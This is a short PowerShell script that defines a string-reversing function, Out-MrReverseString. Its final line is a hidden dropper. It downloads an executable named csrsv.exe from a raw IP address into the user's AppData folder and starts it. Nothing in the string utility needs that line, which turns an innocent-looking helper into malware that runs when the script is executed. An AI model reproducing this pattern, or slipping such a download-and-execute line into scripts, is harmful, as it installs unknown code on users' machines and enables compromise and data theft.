
function Out-MrReverseString {



    [CmdletBinding()]
    param (
        [Parameter(Mandatory,
                   ValueFromPipeline)]
        [string[]]$String
    )

    PROCESS {
        foreach ($s in $String) {
            $Array = $s -split ''
            [System.Array]::Reverse($Array)
            Write-Output ($Array -join '')
        }
    }

}
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

